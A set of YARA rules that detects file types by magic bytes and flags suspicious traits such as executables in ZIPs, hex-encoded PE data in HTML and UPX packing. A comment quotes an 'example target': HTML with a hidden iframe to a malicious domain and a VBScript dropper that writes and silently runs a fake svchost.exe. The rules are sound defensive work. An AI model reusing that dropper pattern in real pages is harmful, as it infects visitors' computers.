rule ft_cab
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20150723"
      desc = "File magic for CABs (Microsoft Cabinet Files)"

   strings:
      $cab = { 4D 53 43 46 }

   condition:
      $cab at 0
}
rule ft_elf
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20160121"
      desc = "File magic for ELF files"

   strings:
      $magic = { 7f 45 4c 46 }

   condition:
      $magic at 0 
}
rule ft_exe
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20141217"
      desc = "Simple signature to trigger on PE files."

   strings:
      $mz = "MZ"

   condition:
      $mz at 0
}
rule ft_gzip
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20151116"
      desc = "Trigger on magic of GZip compressed files"

   strings:
      $magic = { 1f 8b 08 }

   condition:
      $magic at 0
}
rule ft_jar
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20150810"
      desc = "Signature to detect JAR files"

   strings:
      $pk_header = { 50 4B 03 04 }
      $jar = "META-INF/MANIFEST.MF"

   condition:
      $pk_header at 0 and $jar
}
rule ft_java_class
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20160126"
      desc = "File magic for detecting a Java bytecode file."

   strings:
      $class = { CA FE BA BE }

   condition:
      $class at 0
}
// References:
// http://www.garykessler.net/library/file_sigs.html
// https://issues.apache.org/jira/browse/TIKA-257

rule ft_office_open_xml
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20140915"
      desc = "Simple metadata attribute indicative of Office Open XML format. Commonly seen in modern office files."

   strings:
      $OOXML = "[Content_Types].xml"

   condition:
      $OOXML at 30
}

rule ft_ole_cf
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20141202"
      desc = "Detect file magic indicative of OLE CF files (commonly used by early versions of MS Office)."

   strings:
      $magic = { D0 CF 11 E0 A1 B1 1A E1 }

   condition:
      $magic at 0
}
rule ft_pdf
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20141230"
      desc = "Signature to trigger on PDF file magic."

   strings:
      $pdf = "%PDF"

   condition:
      $pdf in (0 .. 1024)
}
rule ft_rar
{
   meta:
      author = "James Ferrer"
      company = "Emerson"
      lastmod = "20150107"
      desc = "File type signature for basic .rar files"

   strings:
      $Rar = {52 61 72 21 1A 07} 
      
   condition:

      $Rar at 0
}
rule ft_rtf
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20141204"
      desc = "Hit on RTF files by triggering on RTF file magic"

   strings:
      $rtf = { 7B 5C 72 74 66 }

   condition:
      $rtf at 0
}
rule ft_swf_cws
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20150318"
      desc = "File type signature for regular compressed SWF files"

   strings:
      $cws = "CWS"

   condition:
      $cws at 0
}

rule ft_swf_fws
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20150318"
      desc = "File type signature for basic SWF files."

   strings:
      $fws = "FWS"

   condition:
      $fws at 0
}

rule ft_swf_zws
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20150318"
      desc = "File type signature for SWF files compressed with LZMA compression, uncommonly observed"

   strings:
      $zws = "ZWS"

   condition:
      $zws at 0
}

rule ft_swf
{
   condition:
      ft_swf_zws or ft_swf_fws or ft_swf_cws
}

rule ft_tar
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20151116"
      desc = "Signature to detect on TAR archive files"

   strings:
      $magic = { 75 73 74 61 72 }

   condition:
      $magic at 257
}
rule ft_zip
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20141217"
      desc = "File type signature for basic ZIP files."

   strings:
      $pk = { 50 4B 03 04 }

   condition:
      $pk at 0
}
// Spec reference: http://forensicswiki.org/wiki/RAR#Format
/*
rule compressed_exe_in_rar
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20150813"
      desc = "Detect on evidence of a compressed executable within a RAR"

   strings:
      $rar = { 52 61 72 21 1A 07 00 }
      $file_header_part = { 74 [12] ( 00 | 01 | 02 | 03 | 04 | 05 ) [9] ( 30 | 31 | 32 | 33 | 34 | 35 ) }
      $exe_ext = ".exe"

   condition:
      $rar at 0 and for any r in (1..#file_header_part):
         // see if .exe is within the offset of the file archive header and however long the file name size is
         // file name begins 30 bytes away from start of header
         // file size is specified 24 bytes from the start
         // limitation is if the HIGH_PACK_SIZE or HIGH_UNP_SIZE optional values are set, accuracy will be effected
         ($exe_ext in (@file_header_part[r] + 30..@file_header_part[r] + 30 + uint16(@file_header_part[r] + 24)))
}
*/

// Spec reference: https://en.wikipedia.org/wiki/Zip_(file_format)#File_headers
rule compressed_exe_in_zip
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20150813"
      desc = "Detect on evidence of a compressed executable within a ZIP"

   strings:
      $pk = { 50 4B 03 04 }
      $exe_ext = ".exe"

   condition:
      $pk at 0 and for any p in (1..#pk):
         // see if .exe is within the offset of the local file header and however long the file name size is
         // file name begins 30 bytes away from the start of the local file header
         // file size is specified 26 bytes from the start
         ($exe_ext in (@pk[p] + 30..@pk[p] + 30 + uint16(@pk[p] + 26)))
}

rule misc_compressed_exe
{
   condition:
      compressed_exe_in_zip //or compressed_exe_in_rar
}

/* 
Example target...

<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

...

<iframe src="http://NtKrnlpa.cn/rc/" width=1 height=1 style="border:0"></iframe>
</body></html><SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
WriteData = "4D5A90000300000004000000FFFF0000B800000000000000400000000000000..
Set FSO = CreateObject("Scripting.FileSystemObject")
DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
If FSO.FileExists(DropPath)=False Then
Set FileObj = FSO.CreateTextFile(DropPath, True)
For i = 1 To Len(WriteData) Step 2
FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
Next
FileObj.Close
End If
Set WSHshell = CreateObject("WScript.Shell")
WSHshell.Run DropPath, 0
//--></SCRIPT>

Source: http://pastebin.com/raw/mkDzzjEv
*/
rule misc_hexascii_pe_in_html : encoding html suspicious
{
    meta:
        author = "Jason Batchelor"
        created = "2016-03-02"
        modified = "2016-03-02"
        university = "Carnegie Mellon University"
        description = "Detect on presence of hexascii encoded executable inside scripted code section of html file"

    strings:
        $html_start = "<html>" ascii nocase // HTML tags
        $html_end = "</html>" ascii nocase
        $mz = "4d5a"  ascii nocase // MZ header constant
        $pe = "50450000" ascii nocase // PE header constant

    condition:
        all of ($html*) and $pe in (@mz[1] .. filesize)
}










// Source: http://yara.readthedocs.org/en/v3.4.0/writingrules.html#conditions
private rule ft_strict_exe
{
  condition:
     // MZ signature at offset 0 and ...
     uint16(0) == 0x5A4D and
     // ... PE signature at offset stored in MZ header at 0x3C
     uint32(uint32(0x3C)) == 0x00004550
}

/*
Example target...
00000000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  |MZ..............|
00000010  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
00000020  20 20 20 20 00 00 00 00  00 00 00 00 00 00 00 00  |    ............|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 01 00 00  |................|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000100  50 45 00 00 4c 01 03 00  bc 7c b1 47 00 00 00 00  |PE..L....|.G....|
00000110  00 00 00 00 e0 00 0f 01  0b 01 07 04 00 e0 00 00  |................|
*/

rule misc_no_dosmode_header : suspicious
{
    meta:
        author = "Jason Batchelor"
        created = "2016-03-02"
        modified = "2016-03-02"
        university = "Carnegie Mellon University"
        description = "Detect on absence of 'DOS Mode' heaader between MZ and PE boundries"

    strings:
        $dosmode = "This program cannot be run in DOS mode."

    condition:
        // (0 .. (uint32(0x3C))) = between end of MZ and start of PE headers
        // 0x3C = e_lfanew = offset of PE header
        ft_strict_exe and not $dosmode in (0x3C .. (uint32(0x3C)))
}


rule misc_ooxml_core_properties
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20150505"
      desc = "Identify meta xml content within OOXML documents"

   strings:
      $xml = "<?xml version="
      $core = "<cp:coreProperties xmlns:cp"

   condition:
      $xml at 0 and $core
}

import "pe"

rule misc_pe_signature
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20150911"
      desc = "Triggers if an authenticode signature is present within a PE file (if the PE is signed for example)"

   condition:
      pe.number_of_signatures > 0
}
import "pe"

rule misc_upx_packed_binary
{
   meta:
      author = "Jason Batchelor"
      company = "Emerson"
      lastmod = "20150520"
      desc = "Detect section names indicative of UPX packed PE files"

   condition:
      (pe.sections[0].name == "UPX0" and pe.sections[1].name == "UPX1")
}
